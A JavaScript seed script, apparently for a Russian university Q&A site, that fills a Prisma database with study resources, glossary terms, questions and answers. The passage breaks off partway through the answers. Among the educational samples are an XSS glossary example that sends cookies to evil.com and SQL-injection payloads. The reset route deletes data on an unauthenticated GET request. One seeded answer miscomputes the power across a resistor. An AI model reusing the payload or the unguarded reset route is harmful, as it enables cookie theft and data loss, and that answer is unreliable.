import { PrismaClient } from "@prisma/client";

const prisma = globalThis.__prisma || new PrismaClient();
if (process.env.NODE_ENV !== "production") globalThis.__prisma = prisma;

function slug(t) {
  return t.trim().toLowerCase().replace(/\s+/g, "-").replace(/[^a-zа-яё0-9-]/g, "");
}

function ruDate(daysAgo) {
  const d = new Date();
  d.setDate(d.getDate() - daysAgo);
  return d;
}

export async function GET(request) {
  try {
    const { searchParams } = new URL(request.url);
    const reset = searchParams.get("reset") === "true";

    if (reset) {
      console.log("Resetting database...");
      await prisma.answerComment.deleteMany();
      await prisma.vote.deleteMany();
      await prisma.questionTag.deleteMany();
      await prisma.answerImage.deleteMany();
      await prisma.questionImage.deleteMany();
      await prisma.answer.deleteMany();
      await prisma.question.deleteMany();
      await prisma.tag.deleteMany();
      await prisma.term.deleteMany();
      await prisma.resource.deleteMany();
      await prisma.category.deleteMany();
      // Не удаляем пользователей
    } else {
      const count = await prisma.category.count();
      if (count > 0) {
        return new Response(JSON.stringify({ message: "База уже заполнена. Добавьте ?reset=true для пересоздания." }), {
          status: 200, headers: { "Content-Type": "application/json" },
        });
      }
    }

    // ==================== ПОЛЬЗОВАТЕЛИ ====================
    const admin = await prisma.user.findFirst({ where: { role: "ADMIN" } });
    const users = [];

    if (!admin) {
      users.push(await prisma.user.create({
        data: { email: "admin@fixlib.local", name: "Администратор", role: "ADMIN" },
      }));
    } else {
      users.push(admin);
    }

    const teacherData = [
      { name: "Иванов Пётр Алексеевич", email: "ivanov@spbugt.ru" },
      { name: "Петрова Елена Владимировна", email: "petrova@spbugt.ru" },
      { name: "Кузнецов Андрей Сергеевич", email: "kuznetsov@spbugt.ru" },
    ];
    for (const td of teacherData) {
      const existing = await prisma.user.findUnique({ where: { email: td.email } });
      users.push(existing || await prisma.user.create({ data: { ...td, role: "USER" } }));
    }

    const studentData = [
      { name: "Сидоров Алексей Иванович", email: "sidorov@study.spbugt.ru" },
      { name: "Козлова Мария Сергеевна", email: "kozlova@study.spbugt.ru" },
      { name: "Новиков Дмитрий Андреевич", email: "novikov@study.spbugt.ru" },
      { name: "Морозова Анна Дмитриевна", email: "morozova@study.spbugt.ru" },
      { name: "Волков Игорь Павлович", email: "volkov@study.spbugt.ru" },
    ];
    for (const sd of studentData) {
      const existing = await prisma.user.findUnique({ where: { email: sd.email } });
      users.push(existing || await prisma.user.create({ data: { ...sd, role: "USER" } }));
    }

    // ==================== КАТЕГОРИИ ====================
    const catData = [
      { name: "Сети и телекоммуникации", color: "#3b82f6", order: 1 },
      { name: "Программирование", color: "#10b981", order: 2 },
      { name: "Математический анализ", color: "#f59e0b", order: 3 },
      { name: "Физика и электроника", color: "#8b5cf6", order: 4 },
      { name: "Базы данных", color: "#ec4899", order: 5 },
      { name: "Информационная безопасность", color: "#ef4444", order: 6 },
      { name: "Инфраструктура и DevOps", color: "#06b6d4", order: 7 },
      { name: "Общие дисциплины", color: "#84cc16", order: 8 },
      { name: "Документация и справочники", color: "#64748b", order: 9 },
      { name: "Инструменты и софт", color: "#f97316", order: 10 },
    ];
    const categories = [];
    for (const cd of catData) {
      categories.push(await prisma.category.create({
        data: { name: cd.name, slug: slug(cd.name), color: cd.color, order: cd.order, status: "APPROVED" },
      }));
    }
    const catMap = {};
    categories.forEach((c, i) => { catMap[catData[i].name] = c.id; });

    // ==================== РЕСУРСЫ ====================
    const resData = [
      // Сети и телекоммуникации
      { name: "Cisco Networking Academy", desc: "Обучающая платформа Cisco по сетевым технологиям, маршрутизации и коммутации", url: "https://www.netacad.com", cat: "Сети и телекоммуникации" },
      { name: "Wireshark", desc: "Анализатор сетевого трафика для отладки и анализа протоколов TCP/IP, UDP, HTTP", url: "https://www.wireshark.org", cat: "Сети и телекоммуникации" },
      { name: "RFC Editor", desc: "Официальный репозиторий запросов на комментарии — стандартов интернета", url: "https://www.rfc-editor.org", cat: "Сети и телекоммуникации" },
      // Программирование
      { name: "Python Documentation", desc: "Официальная документация Python 3 с tutorial и reference", url: "https://docs.python.org/3/", cat: "Программирование" },
      { name: "JavaScript MDN", desc: "Полный справочник по JavaScript от Mozilla Developer Network", url: "https://developer.mozilla.org/ru/docs/Web/JavaScript", cat: "Программирование" },
      { name: "C++ Reference", desc: "Справочник по стандартной библиотеке C++ на cppreference.com", url: "https://en.cppreference.com", cat: "Программирование" },
      { name: "LeetCode", desc: "Платформа для практики алгоритмов и структур данных", url: "https://leetcode.com", cat: "Программирование" },
      // Математический анализ
      { name: "Wolfram Alpha", desc: "Вычислительный движок для решения математических задач, интегралов, производных", url: "https://www.wolframalpha.com", cat: "Математический анализ" },
      { name: "Desmos", desc: "Графический калькулятор для построения графиков функций", url: "https://www.desmos.com", cat: "Математический анализ" },
      { name: "Symbolab", desc: "Символьный калькулятор для решения уравнений, интегралов и производных", url: "https://www.symbolab.com", cat: "Математический анализ" },
      // Физика и электроника
      { name: "Falstad Circuit", desc: "Онлайн-симулятор электронных схем с визуализацией токов", url: "https://www.falstad.com/circuit", cat: "Физика и электроника" },
      { name: "PhET Simulations", desc: "Интерактивные симуляции по физике от Колорадского университета", url: "https://phet.colorado.edu", cat: "Физика и электроника" },
      // Базы данных
      { name: "PostgreSQL Documentation", desc: "Официальная документация СУБД PostgreSQL", url: "https://www.postgresql.org/docs/", cat: "Базы данных" },
      { name: "SQLZoo", desc: "Интерактивный учебник SQL с практическими упражнениями", url: "https://sqlzoo.net", cat: "Базы данных" },
      { name: "Prisma Documentation", desc: "Документация ORM Prisma для работы с базами данных в Node.js", url: "https://www.prisma.io/docs", cat: "Базы данных" },
      // Информационная безопасность
      { name: "OWASP Top 10", desc: "Десятка наиболее критичных угроз безопасности веб-приложений", url: "https://owasp.org/www-project-top-ten/", cat: "Информационная безопасность" },
      { name: "CyberChef", desc: "Веб-инструмент для кодирования, декодирования и анализа данных", url: "https://gchq.github.io/CyberChef", cat: "Информационная безопасность" },
      // Инфраструктура
      { name: "Docker Documentation", desc: "Документация платформы контейнеризации Docker", url: "https://docs.docker.com", cat: "Инфраструктура и DevOps" },
      { name: "Linux Command", desc: "Справочник команд Linux с примерами использования", url: "https://linuxcommand.org", cat: "Инфраструктура и DevOps" },
      // Общие дисциплины
      { name: "Лекторий СПбГУТ", desc: "Электронный архив лекций и учебных материалов СПбГУТ", url: "https://lectoriy.spbugt.ru", cat: "Общие дисциплины" },
      // Документация
      { name: "ГОСТы и стандарты", desc: "Поиск по государственным стандартам РФ", url: "https://gost.ru", cat: "Документация и справочники" },
      // Инструменты
      { name: "Notion", desc: "Универсальный инструмент для заметок, баз знаний и проектного управления", url: "https://www.notion.so", cat: "Инструменты и софт" },
      { name: "Overleaf", desc: "Онлайн-редактор LaTeX для написания научных статей и курсовых", url: "https://www.overleaf.com", cat: "Инструменты и софт" },
      { name: "Draw.io", desc: "Бесплатный инструмент для создания диаграмм и схем", url: "https://app.diagrams.net", cat: "Инструменты и софт" },
    ];

    let resourceCount = 0;
    for (const rd of resData) {
      await prisma.resource.create({
        data: {
          name: rd.name, slug: slug(rd.name), description: rd.desc,
          url: rd.url, categoryId: catMap[rd.cat], status: "APPROVED",
          viewCount: Math.floor(Math.random() * 200) + 10,
        },
      });
      resourceCount++;
    }

    // ==================== ТЕРМИНЫ ====================
    const termData = [
      { t: "TCP/IP", d: "Набор сетевых протоколов, обеспечивающих передачу данных в интернете. TCP гарантирует доставку, IP — адресацию.", ex: ["ping 8.8.8.8 — проверка связи по ICMP", "netstat -an — список активных TCP-соединений"], cat: "Сети и телекоммуникации" },
      { t: "OSI", d: "Эталонная модель взаимосвязи открытых систем. Разделяет сетевое взаимодействие на 7 уровней от физического до прикладного.", ex: ["Уровень 3 — сетевой (IP, маршрутизация)", "Уровень 7 — прикладной (HTTP, FTP)"], cat: "Сети и телекоммуникации" },
      { t: "Подсеть", d: "Часть большей IP-сети, выделенная с помощью маски подсети. Позволяет сегментировать сеть на логические группы.", ex: ["192.168.1.0/24 — подсеть на 254 хоста", "Маска 255.255.255.0 = /24"], cat: "Сети и телекоммуникации" },
      { t: "Рекурсия", d: "Приём программирования, при котором функция вызывает саму себя с изменёнными аргументами до достижения базового случая.", ex: ["factorial(n) = n * factorial(n-1)", "Обход деревьев и графов"], cat: "Программирование" },
      { t: "Полиморфизм", d: "Свойство ООП, позволяющее объектам разных типов обрабатывать один и тот же вызов метода по-разному.", ex: ["Виртуальные функции в C++", "Перегрузка методов в Java"], cat: "Программирование" },
      { t: "Интеграл", d: "Понятие математического анализа, обратное производной. Обозначает площадь под кривой графика функции.", ex: ["∫x²dx = x³/3 + C", "Формула Ньютона-Лейбница"], cat: "Математический анализ" },
      { t: "Производная", d: "Предел отношения приращения функции к приращению аргумента при стремлении приращения аргумента к нулю. Характеризует скорость изменения функции.", ex: ["f'(x) = lim(h→0) [f(x+h) - f(x)] / h", "Производная sin(x) = cos(x)"], cat: "Математический анализ" },
      { t: "Ряд Тейлора", d: "Представление функции в виде бесконечной суммы степенных функций. Используется для приближённых вычислений.", ex: ["e^x = 1 + x + x²/2! + x³/3! + ...", "sin(x) = x - x³/3! + x⁵/5! - ..."], cat: "Математический анализ" },
      { t: "Напряжение", d: "Физическая величина, равная работе электрического поля по перемещению единичного заряда. Измеряется в вольтах (В).", ex: ["U = I × R — закон Ома для участка цепи", "Батарейка AA — 1.5 В"], cat: "Физика и электроника" },
      { t: "Ток смещения", d: "Векторная величина, пропорциональная скорости изменения электрического смещения. Введён Максвеллом для замыкания цепи токов.", ex: ["∂D/∂t — плотность тока смещения", "Уравнения Максвелла"], cat: "Физика и электроника" },
      { t: "Нормализация", d: "Процесс организации данных в реляционной БД для устранения избыточности и аномалий обновления. 3NF — третья нормальная форма.", ex: ["1NF — атомарные значения", "3NF — нет транзитивных зависимостей"], cat: "Базы данных" },
      { t: "Индекс", d: "Структура данных для ускорения поиска записей в таблице. Аналог предметного указателя в книге.", ex: ["CREATE INDEX idx_name ON users(name)", "B-дерево — типичная структура индекса"], cat: "Базы данных" },
      { t: "XSS", d: "Cross-Site Scripting — атака путём внедрения вредоносного кода в веб-страницу. Позволяет украсть cookies и данные пользователя.", ex: ["<script>document.location='evil.com?c='+document.cookie</script>", "Защита: экранирование вывода"], cat: "Информационная безопасность" },
      { t: "SQL-инъекция", d: "Атака путём внедрения SQL-кода в пользовательский ввод. Позволяет прочитать, изменить или удалить данные в БД.", ex: ["' OR 1=1 -- — обход авторизации", "Защита: параметризованные запросы"], cat: "Информационная безопасность" },
      { t: "Контейнер", d: "Изолированная среда выполнения приложения со всеми необходимыми зависимостями. Облегчает развёртывание и масштабирование.", ex: ["docker run -p 3000:3000 myapp", "Dockerfile — описание образа"], cat: "Инфраструктура и DevOps" },
      { t: "Фурье-преобразование", d: "Математическая операция, разлагающая функцию на сумму синусоидальных составляющих. Основа спектрального анализа сигналов.", ex: ["F(ω) = ∫f(t)e^(-jωt)dt", "БПФ — быстрое преобразование Фурье"], cat: "Общие дисциплины" },
      { t: "Энтропия", d: "Мера неопределённости или хаотичности системы. В теории информации — минимальное среднее число бит для кодирования сообщения.", ex: ["H = -Σ p(x) log₂ p(x)", "Энтропия русского алфавита ≈ 4.35 бит/символ"], cat: "Общие дисциплины" },
      { t: "LaTeX", d: "Система вёрстки документов, особенно научных и математических текстов. Использует разметку для описания структуры.", ex: ["\\frac{a}{b} — дробь a/b", "\\int_0^1 x^2 dx — определённый интеграл"], cat: "Инструменты и софт" },
    ];

    let termCount = 0;
    for (const td of termData) {
      await prisma.term.create({
        data: {
          term: td.t, slug: slug(td.t), definition: td.d,
          examples: JSON.stringify(td.ex),
          categoryId: catMap[td.cat] || null, status: "APPROVED",
          viewCount: Math.floor(Math.random() * 100) + 5,
        },
      });
      termCount++;
    }

    // ==================== ТЕГИ ====================
    const tagData = [
      { name: "Сети", color: "#3b82f6" },
      { name: "Python", color: "#10b981" },
      { name: "C++", color: "#6366f1" },
      { name: "Математика", color: "#f59e0b" },
      { name: "Физика", color: "#8b5cf6" },
      { name: "SQL", color: "#ec4899" },
      { name: "Безопасность", color: "#ef4444" },
      { name: "Linux", color: "#06b6d4" },
      { name: "Электроника", color: "#a855f7" },
      { name: "Экзамены", color: "#f97316" },
      { name: "Курсовая", color: "#84cc16" },
      { name: "Теория сигналов", color: "#14b8a6" },
      { name: "Алгоритмы", color: "#e11d48" },
      { name: "Lisp", color: "#7c3aed" },
    ];
    const tags = [];
    for (const td of tagData) {
      tags.push(await prisma.tag.create({
        data: { name: td.name, slug: slug(td.name), color: td.color },
      }));
    }
    const tagMap = {};
    tags.forEach((t, i) => { tagMap[tagData[i].name] = t.id; });

    // ==================== ВОПРОСЫ ====================
    const qData = [
      {
        title: "Как рассчитать маску подсети для 50 хостов?",
        body: "Нужно разделить сеть 192.168.1.0/24 на подсети, каждая из которых вмещает минимум 50 хостов. Какую маску подсети выбрать и почему?\n\nДополнительный вопрос: сколько таких подсетей максимально можно получить?",
        tags: ["Сети", "Экзамены"], cat: "Сети и телекоммуникации", diff: "INTERMEDIATE", author: 1, views: 142, votes: 5, days: 1,
      },
      {
        title: "Объясните разницу между TCP и UDP",
        body: "Преподаватель asked на лекции, но я не совсем понял. В чём принципиальная разница между TCP и UDP? Когда какой использовать?\n\nПриведите примеры протоколов, работающих на каждом из них.",
        tags: ["Сети"], cat: "Сети и телекоммуникации", diff: "BEGINNER", author: 4, views: 234, votes: 8, days: 3,
      },
      {
        title: "Рекурсивная функция для обхода бинарного дерева",
        body: "Нужно написать рекурсивную функцию на Python для обхода бинарного дерева поиска в порядке inorder (левый-корень-правый).\n\n```\nclass Node:\n    def __init__(self, val):\n        self.val = val\n        self.left = None\n        self.right = None\n```\n\nКак это сделать и какова временная сложность?",
        tags: ["Python", "Алгоритмы"], cat: "Программирование", diff: "INTERMEDIATE", author: 5, views: 89, votes: 3, days: 5,
      },
      {
        title: "Ошибка segmentation fault при работе с указателями в C++",
        body: "Пишу программу на C++ и получаю segmentation fault:\n\n```cpp\nint* ptr = new int[5];\nfor (int i = 0; i <= 5; i++) {\n    ptr[i] = i * 2;\n}\n```\n\nВ чём проблема? Как правильно работать с динамической памятью?",
        tags: ["C++"], cat: "Программирование", diff: "BEGINNER", author: 6, views: 156, votes: 4, days: 2,
      },
      {
        title: "Вычислить неопределённый интеграл ∫x·eˣ dx",
        body: "Нужно вычислить интеграл ∫x·eˣ dx методом интегрирования по частям.\n\nПокажите пошаговое решение и проверку результата дифференцированием.",
        tags: ["Математика", "Экзамены"], cat: "Математический анализ", diff: "INTERMEDIATE", author: 4, views: 98, votes: 6, days: 7,
      },
      {
        title: "Что такое ряд Фурье и зачем он нужен в теории сигналов?",
        body: "На лекции по ТКС рассказывали про ряд Фурье, но я не понял практическое применение. Зачем нужно разлагать сигнал на гармоники?\n\nОбъясните простыми словами с примерами из реальной жизни.",
        tags: ["Теория сигналов", "Математика"], cat: "Общие дисциплины", diff: "INTERMEDIATE", author: 7, views: 187, votes: 11, days: 4,
      },
      {
        title: "Расчёт делителя напряжения на резисторах",
        body: "Есть схема делителя напряжения: R1 = 1 кОм, R2 = 2 кОм, Vin = 12 В.\n\nНужно найти Vout и мощность, рассеиваемую на каждом резисторе.\n\nТакже: как изменится Vout, если к выходу подключить нагрузку 1 кОм?",
        tags: ["Физика", "Электроника"], cat: "Физика и электроника", diff: "BEGINNER", author: 5, views: 76, votes: 2, days: 6,
      },
      {
        title: "Написать SQL-запрос для поиска студентов с задолженностями",
        body: "Есть таблицы:\n- `students(id, name, group_id)`\n- `subjects(id, name)`\n- `grades(student_id, subject_id, grade)`\n\nНужно найти всех студентов, у которых есть хотя бы одна оценка 2 (неуд). Вывести: ФИО, группа, предмет, оценка.",
        tags: ["SQL", "Экзамены"], cat: "Базы данных", diff: "INTERMEDIATE", author: 6, views: 203, votes: 7, days: 3,
      },
      {
        title: "Как защититься от SQL-инъекций в веб-приложении?",
        body: "Готовлюсь к экзамену по ИБ. Объясните, что такое SQL-инъекция, какие бывают типы, и какими способами можно от неё защититься?\n\nПриведите примеры уязвимого и безопасного кода.",
        tags: ["Безопасность", "SQL"], cat: "Информационная безопасность", diff: "INTERMEDIATE", author: 7, views: 312, votes: 15, days: 10,
      },
      {
        title: "Настроить Docker-контейнер для веб-приложения на Node.js",
        body: "Нужно написать Dockerfile для приложения на Node.js с Express. Требования:\n- Базовый образ node:20-alpine\n- Установка зависимостей из package.json\n- Порт 3000\n- Многостадийная сборка (builder + runner)",
        tags: ["Linux"], cat: "Инфраструктура и DevOps", diff: "ADVANCED", author: 8, views: 134, votes: 5, days: 8,
      },
      {
        title: "В чём разница между процессом и потоком?",
        body: "Преподаватель asked на защите курсовой, а я запутался. Процесс — это программа в памяти, а поток — это что?\n\nОбъясните разницу на простых примерах. Когда нужно использовать потоки, а когда процессы?",
        tags: ["C++", "Алгоритмы"], cat: "Программирование", diff: "BEGINNER", author: 4, views: 267, votes: 9, days: 12,
      },
      {
        title: "Построить график функции y = x³ - 3x + 1 и найти экстремумы",
        body: "Нужно:\n1. Найти производную\n2. Определить критические точки\n3. Определить характер экстремумов (максимум/минимум)\n4. Построить график\n\nИспользуем методы дифференциального исчисления.",
        tags: ["Математика", "Курсовая"], cat: "Математический анализ", diff: "BEGINNER", author: 5, views: 65, votes: 3, days: 15,
      },
      {
        title: "Как работает DNS-сервер? Пошаговое объяснение",
        body: "Когда я ввожу fixlib.ru в браузере, что происходит? Объясните пошагово:\n1. Запрос к DNS-резолверу\n2. Обращение к корневому серверу\n3. Рекурсивный запрос к TLD-серверу\n4. Получение A-записи\n\nИ что такое кеширование DNS?",
        tags: ["Сети"], cat: "Сети и телекоммуникации", diff: "BEGINNER", author: 6, views: 178, votes: 6, days: 9,
      },
      {
        title: "Реализовать сортировку слиянием (merge sort) на Lisp",
        body: "Нужно реализовать merge sort на Common Lisp для лабораторной по функциональному программированию.\n\nТребования:\n- Рекурсивная реализация\n- Функция слияния двух отсортированных списков\n- Оценка сложности O(n log n)",
        tags: ["Lisp", "Алгоритмы"], cat: "Программирование", diff: "ADVANCED", author: 8, views: 45, votes: 2, days: 20,
      },
      {
        title: "Найти спектр прямоугольного импульса",
        body: "Импульс амплитудой A и длительностью τ. Нужно найти спектральную плотность через преобразование Фурье.\n\nПоказать, что спектр имеет вид sinc-функции, и объяснить физический смысл.",
        tags: ["Теория сигналов", "Математика"], cat: "Общие дисциплины", diff: "ADVANCED", author: 4, views: 92, votes: 4, days: 14,
      },
      {
        title: "Нормализовать схему базы данных библиотеки",
        body: "Есть схема (ненормализованная):\n- `books(id, title, author_name, author_country, genre, publisher, year)`\n\nПривести к 3NF. Показать промежуточные шаги (1NF, 2NF, 3NF) и объяснить, какие аномалии устраняются на каждом этапе.",
        tags: ["SQL", "Курсовая"], cat: "Базы данных", diff: "INTERMEDIATE", author: 7, views: 118, votes: 5, days: 11,
      },
      {
        title: "Как разместить два сайта на одном сервере, чтобы они были доступны по разным доменам?",
        body: "У меня есть VPS с одним IP-адресом. Нужно разместить два сайта: `fixlib.ru` и `mystudy.spbugt.ru`. Оба должны работать на портах 80/443.\n\nКак технически это реализовать? Что такое reverse proxy и virtual hosts? Приведите пример конфигурации.",
        tags: ["Сети", "Linux"], cat: "Инфраструктура и DevOps", diff: "INTERMEDIATE", author: 6, views: 221, votes: 10, days: 2,
      },
      {
        title: "Что такое ARP-спуфинг и как от него защититься?",
        body: "Слышал про атаку ARP-спуфинг в сети. Как она работает технически? Какие есть методы защиты на уровне коммутатора и на уровне хоста?",
        tags: ["Сети", "Безопасность"], cat: "Информационная безопасность", diff: "ADVANCED", author: 5, views: 89, votes: 3, days: 18,
      },
    ];

    const questions = [];
    for (const qd of qData) {
      const q = await prisma.question.create({
        data: {
          title: qd.title,
          slug: slug(qd.title),
          body: qd.body,
          views: qd.views,
          voteCount: qd.votes,
          status: "OPEN",
          difficulty: qd.diff,
          authorId: users[qd.author].id,
          categoryId: catMap[qd.cat] || null,
          createdAt: ruDate(qd.days),
          lastActivityAt: ruDate(qd.days),
        },
      });
      // Привязать теги
      for (const tagName of qd.tags) {
        if (tagMap[tagName]) {
          await prisma.questionTag.create({
            data: { questionId: q.id, tagId: tagMap[tagName] },
          });
        }
      }
      questions.push(q);
    }

    // ==================== ОТВЕТЫ ====================
    const aData = [
      // Q0: Маска подсети
      { qi: 0, author: 1, body: "Для 50 хостов нужно минимум 64 адреса (2^6 = 64). Значит, 6 бит для хостов, 32-6=26 бит для сети.\n\n**Маска: /26 = 255.255.255.192**\n\nПроверка: 2^(32-26) - 2 = 62 хоста ≥ 50 ✓\n\nМаксимальное количество подсетей: 2^(26-24) = 4 подсети.", accepted: true, votes: 8 },
      { qi: 0, author: 2, body: "Дополню: можно использовать формулу 2^n ≥ H + 2, где H — количество хостов, n — количество бит для хостов.\n\n2^6 = 64 ≥ 50 + 2 = 52 ✓\n\nМаска: 255.255.255.192 (/26)", votes: 3 },
      // Q1: TCP vs UDP
      { qi: 1, author: 1, body: "**TCP** — протокол с установлением соединения (three-way handshake). Гарантирует доставку, порядок и целостность данных.\n\n**UDP** — протокол без соединения. Не гарантирует доставку, но работает быстрее.\n\n**TCP:** HTTP, HTTPS, FTP, SMTP, SSH\n**UDP:** DNS, DHCP, TFTP, SNMP, видео- и аудиопотоки\n\nПравило: если важна надёжность — TCP. Если скорость — UDP.", accepted: true, votes: 12 },
      { qi: 1, author: 3, body: "Ещё важное отличие: TCP имеет механизм контроля перегрузки (congestion control), а UDP — нет.\n\nПоэтому при потоковой передаче видео UDP может забить канал, а TCP автоматически снизит скорость.", votes: 5 },
      // Q2: Рекурсия inorder
      { qi: 2, author: 2, body: "```python\ndef inorder(root):\n    if root is None:\n        return []\n    return inorder(root.left) + [root.val] + inorder(root.right)\n```\n\nСложность: O(n) — каждый узел посещается ровно один раз.\n\nПространственная сложность: O(h) где h — высота дерева (стек вызовов).", accepted: true, votes: 6 },
      { qi: 2, author: 4, body: "Можно также сделать итеративную версию через стек:\n\n```python\ndef inorder_iterative(root):\n    stack, result = [], []\n    node = root\n    while stack or node:\n        while node:\n            stack.append(node)\n            node = node.left\n        node = stack.pop()\n        result.append(node.val)\n        node = node.right\n    return result\n```", votes: 2 },
      // Q3: Segmentation fault
      { qi: 3, author: 3, body: "Проблема: `i <= 5` — выход за границы массива. Массив из 5 элементов имеет индексы 0-4, а вы обращаетесь к индексу 5.\n\n**Исправление:** `i < 5`\n\nТакже не забудьте освободить память: `delete[] ptr;`", accepted: true, votes: 7 },
      { qi: 3, author: 1, body: "Дополню: в C++ лучше использовать `std::vector` вместо ручного управления памятью:\n\n```cpp\n#include <vector>\nstd::vector<int> arr(5);\nfor (int i = 0; i < arr.size(); i++) {\n    arr[i] = i * 2;\n}\n```\n\nVector автоматически освобождает память при выходе из области видимости.", votes: 4 },
      // Q4: Интеграл
      { qi: 4, author: 2, body: "**Решение по частям:**\n\n∫x·eˣ dx\n\nu = x → du = dx\nv = eˣ → dv = eˣ dx\n\n∫x·eˣ dx = x·eˣ - ∫eˣ dx = x·eˣ - eˣ + C = eˣ(x - 1) + C\n\n**Проверка:** d/dx[eˣ(x-1)] = eˣ(x-1) + eˣ = x·eˣ ✓", accepted: true, votes: 10 },
      // Q5: Ряд Фурье
      { qi: 5, author: 3, body: "Простыми словами: любой периодический сигнал можно представить как сумму синусоид разных частот (гармоник).\n\n**Пример из жизни:** звук аккорда гитары — это сумма звуков отдельных струн. Каждая струна — «гармоника».\n\n**Практическое применение:**\n- Анализ спектра аудио (эквалайзер)\n- Сжатие данных (MP3 убирает «невидимые» гармоники)\n- Фильтрация (убрать шум = убрать определённые частоты)", accepted: true, votes: 14 },
      { qi: 5, author: 1, body: "Математически: F(ω) = ∫f(t)·e^(-jωt)dt\n\nГде ω — частота, F(ω) — комплексная амплитуда гармоники.\n\n|F(ω)| — амплитудный спектр\narg(F(ω)) — фазовый спектр", votes: 6 },
      // Q6: Делитель напряжения
      { qi: 6, author: 2, body: "**Без нагрузки:**\nVout = Vin × R2/(R1+R2) = 12 × 2/3 = 8 В\n\nP1 = V1²/R1 = 16²/1000 = 0.256 Вт\nP2 = Vout²/R2 = 8²/2000 = 0.032 Вт\n\n**С нагрузкой 1 кОм:**\nR2 параллельно с Rн = 2×1/(2+1) = 0.667 кОм\nVout = 12 × 0.667/(1+0.667) = 4.8 В", accepted: true, votes: 5 },
      // Q7: SQL запрос
      { qi: 7, author: 2, body: "```sql\nSELECT s.name AS student_name, g.group_id, sub.name AS subject, gr.grade\nFROM students s\nJOIN grades gr ON gr.student_id = s.id\nJOIN subjects sub ON gr.subject_id = sub.id\nWHERE gr.grade = 2\nORDER BY s.name, sub.name;\n```\n\nЕсли нужна таблица групп, добавьте JOIN с таблицей groups.", accepted: true, votes: 9 },
      { qi: 7, author: 3, body: "Вариант с подзапросом (более компактный):\n\n```sql\nSELECT name, group_id, subject, grade\nFROM (\n    SELECT s.name, g.group_id, sub.name AS subject, gr.grade\n    FROM students s\n    JOIN grades gr ON gr.student_id = s.id\n    JOIN subjects sub ON gr.subject_id = sub.id\n) t\nWHERE grade = 2;\n```", votes: 3 },
      // Q8: SQL-инъекции
      { qi: 8, author: 1, body: "**Типы SQL-инъекций:**\n1. **Classic** — `' OR 1=1 --`\n2. **Blind** — Boolean-based и Time-based\n3. **Union-based** — `' UNION SELECT 1,2,3 --`\n4. **Second-order** — через сохранённые данные\n\n**Защита:**\n1. Параметризованные запросы (prepared statements)\n2. ORM (Prisma, Hibernate)\n3. Валидация входных данных\n4. Principle of Least Privilege\n5. WAF", accepted: true, votes: 18 },
      // Q9: Docker
      { qi: 9, author: 3, body: "```dockerfile\n# Builder\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# Runner\nFROM node:20-alpine\nWORKDIR /app\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY --from=builder /app/.next/standalone ./\nCOPY --from=builder /app/.next/static ./.next/static\nCOPY --from=builder /app/public ./public\nEXPOSE 3000\nCMD [\"node\", \"server.js\"]\n```\n\nРазмер образа уменьшится с ~1 ГБ до ~150 МБ.", accepted: true, votes: 7 },
      // Q10: Процесс vs поток
      { qi: 10, author: 1, body: "**Процесс** — экземпляр программы в памяти. Имеет своё адресное пространство, дескрипторы файлов, переменные окружения.\n\n**Поток** — единица выполнения внутри процесса. Делит адресное пространство с другими потоками того же процесса.\n\n**Аналогия:** Процесс = дом, поток = комната в доме. Жильцы (потоки) делят кухню и ванную (общая память), но у каждого свой шкаф (стек).\n\n**Потоки** — когда нужна общая память и быстрое переключение.\n**Процессы** — когда нужна изоляция и безопасность.", accepted: true, votes: 13 },
      { qi: 10, author: 2, body: "Важно: переключение контекста между потоками одного процесса быстрее (не нужно менять таблицы страниц). Но потоки опаснее — ошибка в одном потоке может убить весь процесс.", votes: 4 },
      // Q11: Экстремумы
      { qi: 11, author: 2, body: "f(x) = x³ - 3x + 1\nf'(x) = 3x² - 3 = 0\nx² = 1 → x = ±1\n\nf''(x) = 6x\n\nx = -1: f''(-1) = -6 < 0 → **максимум**, f(-1) = 3\nx = 1: f''(1) = 6 > 0 → **минимум**, f(1) = -1\n\nТочки перегиба: f''(x) = 0 → x = 0", accepted: true, votes: 7 },
      // Q12: DNS
      { qi: 12, author: 1, body: "1. Браузер проверяет локальный кеш\n2. Запрос к DNS-резолверу провайдера\n3. Запрос к корневому DNS-серверу (.) → куда идти?\n4. Запрос к TLD-серверу (.ru) → какой NS-сервер?\n5. Запрос к NS-серверу fixlib.ru → A-запись → IP\n6. Кеширование результата на каждом уровне\n\n**TTL** (Time To Live) — время жизни записи в кеше.", accepted: true, votes: 8 },
      // Q13: Merge sort на Lisp
      { qi: 13, author: 3, body: "```lisp\n(defun merge (l1 l2)\n  (cond ((null l1) l2)\n        ((null l2) l1)\n        ((<= (first l1) (first l2))\n         (cons (first l1) (merge (rest l1) l2)))\n        (t (cons (first l2) (merge l1 (rest l2))))))\n\n(defun merge-sort (lst)\n  (if (or (null lst) (null (rest lst)))\n      lst\n      (let ((mid (floor (length lst) 2)))\n        (merge (merge-sort (subseq lst 0 mid))\n               (merge-sort (subseq lst mid))))))\n```\n\nСложность: O(n log n) по времени, O(n) по памяти.", accepted: true, votes: 4 },
      // Q14: Спектр импульса
      { qi: 14, author: 1, body: "S(ω) = A·τ·sinc(ωτ/2π)·e^(-jωτ/2)\n\nгде sinc(x) = sin(πx)/(πx)\n\n|S(ω)| = A·τ·|sinc(ωτ/2π)|\n\nНули спектра при ω = 2πn/τ (n ≠ 0). Ширина главного лепестка: 2π/τ.\n\n**Физический смысл:** чем короче импульс, тем шире спектр. Прямо пропорциональная связь между длительностью сигнала и шириной его спектра.", accepted: true, votes: 6 },
      // Q15: Нормализация
      { qi: 15, author: 2, body: "**1NF:** уже выполнена (атомарные значения)\n\n**2NF:** Устраняем частичные зависимости от составного ключа (book_id, author_name).\n→ Выделяем `authors(id, name, country)`\n\n**3NF:** Устраняем транзитивные зависимости (publisher → genre).\n→ Выделяем `publishers(id, name)`\n\nИтог: `books`, `authors`, `publishers`, `book_authors`, `book_genres`", accepted: true, votes: 8 },
      // Q16: Reverse proxy — два сайта на одном сервере
